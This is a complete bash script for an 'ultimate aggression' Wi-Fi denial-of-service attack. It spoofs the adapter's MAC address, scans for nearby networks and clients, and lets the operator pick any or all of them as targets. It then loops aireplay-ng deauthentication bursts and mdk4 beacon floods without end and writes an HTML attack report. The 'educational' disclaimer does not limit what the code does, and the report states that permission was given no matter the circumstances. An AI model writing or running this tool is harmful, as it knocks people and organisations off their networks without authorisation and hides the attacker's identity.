#!/bin/bash

# Multi-Target Wi-Fi Deauthentication Script (Ultimate Aggression Mode)
# Designed for educational purposes in a controlled lab environment to demonstrate Wi-Fi vulnerabilities.
# Features: Robust packet injection, multiple deauth reasons, beacon flooding, MAC spoofing, signal strength prioritization,
# packet counting, ASCII chart visualization, and HTML report generation for a professional project submission.

# --- Disclaimer ---
# This script is for EDUCATIONAL PURPOSES ONLY in a controlled lab environment (e.g., your own test network or with explicit permission).
# Unauthorized use of this script to disrupt networks is illegal (e.g., violates CFAA in the US or similar laws elsewhere).
# Ensure you have explicit permission from network owners and comply with local laws.

# --- Global Variables ---
OUTPUT_DIR=""
INTERFACE=""
MON_IFACE=""
SCAN_FILE=""
NETWORKS=()        # Array for APs: "bssid,channel,essid,power,num_clients"
CLIENTS=()         # Array for clients: "client_mac,bssid,power"
declare -A CHANNEL_GROUPS  # channel -> list of "bssid,essid"
TOTAL_PACKETS_SENT=0  # Global counter for all sent packets
declare -A PACKET_COUNTS  # Per-target packet counts for reporting
HTML_REPORT="$OUTPUT_DIR/attack_report.html"

# --- Utility Functions ---

# Function to display usage
usage() {
    echo "Usage: $0 [-o output-dir]"
    echo "Example: $0 -o disruption_logs"
    echo "  -o <dir>: Specify output directory (default: deauth_data_<timestamp>)"
    exit 1
}

# Function to add color to output
color_echo() {
    local color=$1
    shift
    case $color in
        red) echo -e "\033[31m$@\033[0m" ;;
        green) echo -e "\033[32m$@\033[0m" ;;
        yellow) echo -e "\033[33m$@\033[0m" ;;
        blue) echo -e "\033[34m$@\033[0m" ;;
        *) echo "$@" ;;
    esac
}

# Function to check and install required tools
check_install_tools() {
    for tool in aircrack-ng airmon-ng airodump-ng aireplay-ng mdk4 iwconfig iw ifconfig macchanger; do
        if ! command -v $tool &> /dev/null; then
            color_echo red "[!] $tool not found. Attempting to install required tools..."
            if [[ $(uname -s) == "Linux" && -n "$(command -v apt-get)" ]]; then
                sudo apt-get update && sudo apt-get install -y aircrack-ng mdk4 macchanger iw ifupdown
                if [ $? -ne 0 ]; then
                    color_echo red "[X] Failed to install required tools. Please install manually."
                    exit 1
                fi
            else
                color_echo red "[X] Automatic installation unsupported on this OS. Install aircrack-ng, mdk4, and macchanger manually."
                exit 1
            fi
            if ! command -v $tool &> /dev/null; then
                color_echo red "[X] Installation attempt failed for $tool. Exiting."
                exit 1
            fi
        fi
    done
    color_echo green "[+] All required tools are installed (aircrack-ng, mdk4, macchanger)."
}

# Function to check root privileges
check_root() {
    if [ "$EUID" -ne 0 ]; then
        color_echo red "[X] This script must be run as root (use sudo)."
        exit 1
    fi
}

# Function to list and select wireless interface
select_interface() {
    color_echo blue "[*] Detecting wireless interfaces..."
    interfaces=($(iwconfig 2>/dev/null | grep -oP '^\w+' | grep -v '^lo' | sort -u))
    if [ ${#interfaces[@]} -eq 0 ]; then
        color_echo red "[X] No wireless interfaces found. Check with 'iwconfig'."
        exit 1
    fi

    color_echo blue ""
    color_echo blue "==================================="
    color_echo blue " Available Wireless Interfaces "
    color_echo blue "==================================="
    for i in "${!interfaces[@]}"; do
        printf "%-3s | %s\n" "$((i+1))" "${interfaces[$i]}"
    done
    echo "-----------------------------------"

    echo -n "[?] Enter the number of the interface to use (1-${#interfaces[@]}): "
    read selection
    if ! [[ "$selection" =~ ^[0-9]+$ ]] || [ "$selection" -lt 1 ] || [ "$selection" -gt ${#interfaces[@]} ]; then
        color_echo red "[X] Invalid selection."
        exit 1
    fi

    INTERFACE="${interfaces[$((selection-1))]}"
    color_echo green "[+] Selected interface: $INTERFACE"
}

# Function to reset interface to managed mode
reset_interface() {
    local iface=$1
    color_echo blue "[*] Resetting interface $iface to managed mode..."
    sudo ifconfig "$iface" down 2>/dev/null
    sudo iwconfig "$iface" mode managed 2>/dev/null
    sudo ifconfig "$iface" up 2>/dev/null
    sleep 1
}

# Function to spoof MAC address
spoof_mac() {
    local iface=$1
    color_echo blue "[*] Spoofing MAC address for $iface..."
    sudo ifconfig "$iface" down
    sudo macchanger -r "$iface" > "$OUTPUT_DIR/macchanger_log.txt" 2>&1
    sudo ifconfig "$iface" up
    new_mac=$(macchanger -s "$iface" | grep -oP 'Current MAC:.*\K[0-9A-F:]{17}')
    color_echo green "[+] MAC address spoofed to $new_mac."
}

# Function to enable monitor mode
enable_monitor_mode() {
    local iface=$1
    color_echo blue "[*] Aggressively stopping interfering processes..."
    sudo airmon-ng check kill > /dev/null 2>&1
    reset_interface "$iface"
    color_echo blue "[*] Enabling monitor mode on $iface..."
    sudo airmon-ng start "$iface" > "$OUTPUT_DIR/airmon_log.txt" 2>&1
    MON_IFACE=$(iwconfig 2>/dev/null | grep -oP '^\w+mon' | head -n 1)

    if [ -z "$MON_IFACE" ]; then
        MON_IFACE="$iface"
        sudo ifconfig "$MON_IFACE" up 2>/dev/null
        sudo iwconfig "$MON_IFACE" mode monitor 2>/dev/null
        if ! iwconfig "$MON_IFACE" 2>/dev/null | grep -q "Mode:Monitor"; then
            color_echo red "[X] Failed to enable monitor mode. Check $OUTPUT_DIR/airmon_log.txt."
            exit 1
        fi
    fi
    color_echo green "[+] Monitor mode enabled on $MON_IFACE."
    spoof_mac "$MON_IFACE"
}

# Function to disable monitor mode
disable_monitor_mode() {
    local mon_iface=$1
    local orig_iface=$2
    color_echo blue "[*] Disabling monitor mode on $mon_iface..."
    sudo airmon-ng stop "$mon_iface" > /dev/null 2>&1
    reset_interface "$orig_iface"
    sudo systemctl start NetworkManager 2>/dev/null
    sudo systemctl restart network-manager 2>/dev/null
    color_echo green "[+] Cleanup complete. NetworkManager restarted."
}

# Function to test packet injection with robust fallbacks
test_injection() {
    local mon_iface=$1
    local retries=5
    local attempt=1

    while [ $attempt -le $retries ]; do
        color_echo blue "[*] Testing packet injection on $mon_iface (Attempt $attempt/$retries)..."
        sudo iwconfig "$mon_iface" channel 1 2>/dev/null
        sleep 1
        aireplay-ng -9 "$mon_iface" > "$OUTPUT_DIR/injection_test_log.txt" 2>&1
        if grep -q "Injection is working" "$OUTPUT_DIR/injection_test_log.txt" || grep -q "Sent" "$OUTPUT_DIR/injection_test_log.txt"; then
            color_echo green "[+] Packet injection test passed."
            return 0
        fi
        color_echo yellow "[!] Injection test failed. Retrying with adapter reset..."
        reset_interface "$mon_iface"
        sudo ifconfig "$mon_iface" up 2>/dev/null
        sudo iwconfig "$mon_iface" mode monitor 2>/dev/null
        sudo airmon-ng check kill > /dev/null 2>&1
        ((attempt++))
        sleep 2
    done
    color_echo yellow "[!] Injection test failed after $retries attempts. Continuing with warning (adapter reported functional)."
}

# Function to scan for Wi-Fi networks and clients
scan_wifi() {
    local mon_iface=$1
    local output_dir=$2
    SCAN_FILE="$output_dir/scan-01.csv"
    local SCAN_DURATION=60  # Increased for better detection

    color_echo blue ""
    color_echo blue "=========================================================="
    color_echo blue " [*] Scanning for networks and clients ($SCAN_DURATION seconds, 2.4/5 GHz) "
    color_echo blue "=========================================================="
    sudo airodump-ng --band abg --output-format csv -w "$output_dir/scan" "$mon_iface" > "$output_dir/airodump_scan_log.txt" 2>&1 &
    SCAN_PID=$!

    local i=0
    local spinner="/-\|"
    local end_time=$(( $(date +%s) + SCAN_DURATION ))

    while [ $(date +%s) -lt $end_time ]; do
        printf "\rScanning... ${spinner:$i:1} (Remaining: $((end_time - $(date +%s)))s) "
        i=$(( (i+1) % 4 ))
        sleep 1
    done

    printf "\rStopping airodump-ng...\n"
    kill $SCAN_PID 2>/dev/null
    wait $SCAN_PID 2>/dev/null

    if [ ! -f "$SCAN_FILE" ] || [ ! -s "$SCAN_FILE" ]; then
        color_echo red "[X] Scan failed. No results found. Check $OUTPUT_DIR/airodump_scan_log.txt."
        exit 1
    fi
    color_echo green "[+] Scan completed. Processing results..."
}

# Function to parse APs and clients from CSV
parse_csv() {
    local csv_file=$1
    local reading_aps=true

    NETWORKS=()
    CLIENTS=()

    while IFS= read -r line; do
        line=$(echo "$line" | tr -d '\r')
        if [[ "$line" =~ "Station MAC" ]]; then
            reading_aps=false
            continue
        fi

        if $reading_aps; then
            bssid=$(echo "$line" | cut -d',' -f1 | xargs)
            channel=$(echo "$line" | cut -d',' -f4 | xargs)
            power=$(echo "$line" | cut -d',' -f9 | xargs)
            essid=$(echo "$line" | cut -d',' -f14- | xargs)

            if [[ "$bssid" =~ ^[0-9A-Fa-f:]{17}$ && -n "$channel" && "$channel" =~ ^[0-9]+$ ]]; then
                essid_clean=$(echo "$essid" | sed 's/^[ \t]*//;s/[ \t]*$//;s/[^a-zA-Z0-9_-]/_/g')
                if [ -z "$essid_clean" ]; then
                    essid_clean="Hidden_SSID_$(( ${#NETWORKS[@]} + 1 ))"
                fi
                NETWORKS+=("$bssid,$channel,$essid_clean,$power,0")
            fi
        else
            client_mac=$(echo "$line" | cut -d',' -f1 | xargs)
            bssid=$(echo "$line" | cut -d',' -f6 | xargs)
            power=$(echo "$line" | cut -d',' -f4 | xargs)

            if [[ "$client_mac" =~ ^[0-9A-Fa-f:]{17}$ && "$bssid" != "not associated" ]]; then
                CLIENTS+=("$client_mac,$bssid,$power")
                for j in "${!NETWORKS[@]}"; do
                    IFS=',' read -r ap_bssid ap_channel ap_essid ap_power ap_num_clients <<< "${NETWORKS[$j]}"
                    if [ "$ap_bssid" == "$bssid" ]; then
                        ap_num_clients=$((ap_num_clients + 1))
                        NETWORKS[$j]="$ap_bssid,$ap_channel,$ap_essid,$ap_power,$ap_num_clients"
                        break
                    fi
                done
            fi
        fi
    done < "$csv_file"

    # Sort networks by power (strongest first)
    IFS=$'\n' NETWORKS=($(sort -t',' -k4 -nr <<<"${NETWORKS[*]}"))
}

# Function to display networks and allow multi-selection
select_targets() {
    local csv_file=$1
    parse_csv "$csv_file"

    if [ ${#NETWORKS[@]} -eq 0 ]; then
        color_echo red "[X] No networks found. Exiting."
        exit 1
    fi

    color_echo blue ""
    color_echo blue "==================================================================="
    color_echo blue " Select Target Networks for Disruption (Sorted by Signal Strength) "
    color_echo blue "==================================================================="
    echo "No. | SSID                           | BSSID             | CH | Power | Clients"
    echo "-----------------------------------------------------------------------"
    local network_count=1
    for i in "${!NETWORKS[@]}"; do
        IFS=',' read -r bssid channel essid power num_clients <<< "${NETWORKS[$i]}"
        printf "%-3s | %-30s | %-17s | %-2s | %-5s | %-7s\n" "$network_count" "$essid" "$bssid" "$channel" "$power" "$num_clients"
        ((network_count++))
    done
    echo "-----------------------------------------------------------------------"

    echo -n "[?] Enter the numbers of the networks to disrupt (e.g., 1,3,5 or 'all'): "
    read selections

    if [ "$selections" == "all" ]; then
        selected_targets=("${NETWORKS[@]}")
    else
        local selected_targets=()
        IFS=',' read -ra indices <<< "$selections"
        for index_str in "${indices[@]}"; do
            index_str=$(echo "$index_str" | xargs)
            if [[ "$index_str" =~ ^[0-9]+$ ]]; then
                local index=$((index_str - 1))
                if [ "$index" -ge 0 ] && [ "$index" -lt ${#NETWORKS[@]} ]; then
                    selected_targets+=("${NETWORKS[$index]}")
                fi
            fi
        done
    fi

    if [ ${#selected_targets[@]} -eq 0 ]; then
        color_echo red "[X] No valid targets selected. Exiting."
        exit 1
    fi

    declare -gA CHANNEL_GROUPS=()
    for target in "${selected_targets[@]}"; do
        IFS=',' read -r bssid channel essid power num_clients <<< "$target"
        CHANNEL_GROUPS["$channel"]+="$bssid,$essid "
    done

    color_echo green "[+] Selected ${#selected_targets[@]} target(s) across ${#CHANNEL_GROUPS[@]} channel(s) for disruption."
}

# Function to count packets from aireplay-ng logs
count_packets() {
    local log_file=$1
    local packet_count=0
    if [ -f "$log_file" ]; then
        packet_count=$(grep -o "Sent [0-9]\+ packets" "$log_file" | awk '{sum += $2} END {print sum}')
        packet_count=${packet_count:-0}
    fi
    echo $packet_count
}

# Function to generate ASCII chart for packet counts
generate_ascii_chart() {
    local max_packets=$1
    local -a labels=("${@:2}")
    local max_bar_length=50
    local max_value=0

    for count in "${PACKET_COUNTS[@]}"; do
        [ "$count" -gt "$max_value" ] && max_value=$count
    done
    [ $max_value -eq 0 ] && max_value=1

    color_echo blue "\nPacket Count Chart (Per Target):"
    echo "--------------------------------------------------"
    for label in "${labels[@]}"; do
        count=${PACKET_COUNTS["$label"]}
        count=${count:-0}
        bar_length=$((count * max_bar_length / max_value))
        bar=$(printf "%${bar_length}s" | tr ' ' '#')
        printf "%-30s | %-50s %s\n" "$label" "$bar" "$count"
    done
    echo "--------------------------------------------------"
}

# Function to generate HTML report
generate_html_report() {
    local targets=("${@}")
    local timestamp=$(date '+%Y-%m-%d %H:%M:%S')
    cat << EOF > "$HTML_REPORT"
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Wi-Fi Deauthentication Attack Report</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 20px; }
        h1 { color: #333; }
        table { border-collapse: collapse; width: 100%; }
        th, td { border: 1px solid #ddd; padding: 8px; text-align: left; }
        th { background-color: #4CAF50; color: white; }
        tr:nth-child(even) { background-color: #f2f2f2; }
        .summary { margin-top: 20px; }
    </style>
</head>
<body>
    <h1>Wi-Fi Deauthentication Attack Report</h1>
    <p><strong>Date:</strong> $timestamp</p>
    <p><strong>Interface:</strong> $INTERFACE ($MON_IFACE)</p>
    <p><strong>Total Packets Sent:</strong> $TOTAL_PACKETS_SENT</p>
    <h2>Targeted Networks</h2>
    <table>
        <tr>
            <th>SSID</th>
            <th>BSSID</th>
            <th>Channel</th>
            <th>Power (dBm)</th>
            <th>Clients</th>
            <th>Packets Sent</th>
        </tr>
EOF
    for target in "${targets[@]}"; do
        IFS=',' read -r bssid channel essid power num_clients <<< "$target"
        packets=${PACKET_COUNTS["$bssid"]:-0}
        echo "        <tr>" >> "$HTML_REPORT"
        echo "            <td>$essid</td>" >> "$HTML_REPORT"
        echo "            <td>$bssid</td>" >> "$HTML_REPORT"
        echo "            <td>$channel</td>" >> "$HTML_REPORT"
        echo "            <td>$power</td>" >> "$HTML_REPORT"
        echo "            <td>$num_clients</td>" >> "$HTML_REPORT"
        echo "            <td>$packets</td>" >> "$HTML_REPORT"
        echo "        </tr>" >> "$HTML_REPORT"
    done
    cat << EOF >> "$HTML_REPORT"
    </table>
    <div class="summary">
        <h2>Summary</h2>
        <p>Attack conducted in a controlled lab environment for educational purposes.</p>
        <p>Logs available in: $OUTPUT_DIR</p>
        <p><strong>Disclaimer:</strong> This test was performed with explicit permission on a test network.</p>
    </div>
</body>
</html>
EOF
    color_echo green "[+] HTML report generated at $HTML_REPORT"
}

# Function for beacon flooding to disrupt channel
beacon_flood() {
    local mon_iface=$1
    local channel=$2
    color_echo yellow "[*] Starting beacon flood on channel $channel to disrupt nearby devices..."
    mdk4 "$mon_iface" -c "$channel" -B > "$OUTPUT_DIR/beacon_flood_log.txt" 2>&1 &
    BEACON_PID=$!
    sleep 5  # Run briefly to avoid overwhelming the adapter
    kill $BEACON_PID 2>/dev/null
    wait $BEACON_PID 2>/dev/null
    color_echo green "[+] Beacon flood completed for channel $channel."
}

# Function for continuous channel hopping and deauthentication
start_deauth_attack() {
    local mon_iface=$1
    color_echo blue ""
    color_echo blue "==================================================================="
    color_echo blue " Starting Multi-Target Deauthentication Attack (Ctrl+C to stop) "
    color_echo blue "==================================================================="

    local deauth_burst=10000  # Ultra-aggressive burst size
    local cycle_delay=0.005   # Minimal delay for max speed
    local deauth_reasons=(1 2 4 7)  # Multiple deauth reasons (unspecified, class2, class3, AP leaving)

    local cycle=1
    local selected_targets=()
    for channel in "${!CHANNEL_GROUPS[@]}"; do
        IFS=' ' read -ra targets <<< "${CHANNEL_GROUPS[$channel]}"
        for target in "${targets[@]}"; do
            selected_targets+=("$target,$channel")
        done
    done

    while true; do
        color_echo yellow "--- Attack Cycle $cycle (Burst: $deauth_burst, Delay: ${cycle_delay}s) ---"
        local cycle_packets=0
        for channel in "${!CHANNEL_GROUPS[@]}"; do
            color_echo blue "[*] Switching to Channel $channel"
            sudo iwconfig "$mon_iface" channel "$channel" 2>/dev/null
            sleep 0.1  # Brief delay for channel stability

            # Beacon flood to disrupt channel
            beacon_flood "$mon_iface" "$channel"

            IFS=' ' read -ra targets <<< "${CHANNEL_GROUPS[$channel]}"
            for target in "${targets[@]}"; do
                IFS=',' read -r bssid essid <<< "$target"
                color_echo yellow "[ATTACK] Disrupting $essid ($bssid) on Channel $channel"

                # Rotate through deauth reasons
                local reason=${deauth_reasons[$((cycle % ${#deauth_reasons[@]}))]}
                local log_file="$OUTPUT_DIR/deauth_${bssid}_log.txt"
                aireplay-ng -0 "$deauth_burst" -a "$bssid" -R "$reason" "$mon_iface" -D > "$log_file" 2>&1 &
                DEAUTH_PID=$!

                # Deauth clients in parallel
                local client_targets=0
                for client_entry in "${CLIENTS[@]}"; do
                    IFS=',' read -r client_mac client_bssid _ <<< "$client_entry"
                    if [ "$client_bssid" == "$bssid" ]; then
                        color_echo yellow "  - Targeting client $client_mac (Reason: $reason)"
                        aireplay-ng -0 "$deauth_burst" -a "$bssid" -c "$client_mac" -R "$reason" "$mon_iface" -D >> "$log_file" 2>&1 &
                        client_targets=$((client_targets + 1))
                    fi
                done

                wait $DEAUTH_PID
                wait

                # Count packets sent
                local sent_packets=$(count_packets "$log_file")
                cycle_packets=$((cycle_packets + sent_packets))
                TOTAL_PACKETS_SENT=$((TOTAL_PACKETS_SENT + sent_packets))
                PACKET_COUNTS["$bssid"]=$(( ${PACKET_COUNTS["$bssid"]:-0} + sent_packets ))
                color_echo green "  [+] Sent $sent_packets packets to $essid ($bssid) and $client_targets client(s)"
            done
            sleep "$cycle_delay"
        done
        color_echo green "[+] Cycle $cycle completed. Packets sent this cycle: $cycle_packets, Total: $TOTAL_PACKETS_SENT"

        # Generate ASCII chart
        local labels=()
        for target in "${selected_targets[@]}"; do
            IFS=',' read -r bssid _ essid _ <<< "$target"
            labels+=("$essid ($bssid)")
        done
        generate_ascii_chart "$TOTAL_PACKETS_SENT" "${labels[@]}"

        # Generate HTML report
        generate_html_report "${selected_targets[@]}"

        ((cycle++))
    done
}

# --- Main Execution ---

# Parse arguments
while [[ $# -gt 0 ]]; do
    case $1 in
        -o)
            OUTPUT_DIR="$2"
            shift 2
            ;;
        *)
            usage
            ;;
    esac
done

# Set default output directory
TIMESTAMP=$(date '+%Y%m%d_%H%M%S')
if [ -z "$OUTPUT_DIR" ]; then
    OUTPUT_DIR="deauth_data_$TIMESTAMP"
fi
mkdir -p "$OUTPUT_DIR"

# Check prerequisites
check_root
check_install_tools

# Select interface
select_interface

# Set trap to clean up on exit/interrupt
trap 'disable_monitor_mode "$MON_IFACE" "$INTERFACE"; color_echo green "Attack stopped. Total packets sent: $TOTAL_PACKETS_SENT"; generate_html_report "${selected_targets[@]}"; exit' EXIT SIGINT

# Enable monitor mode
enable_monitor_mode "$INTERFACE"

# Test injection
test_injection "$MON_IFACE"

# Scan for networks
scan_wifi "$MON_IFACE" "$OUTPUT_DIR"

# Display networks and prompt for selection
select_targets "$SCAN_FILE"

# Start the disruption attack
start_deauth_attack "$MON_IFACE"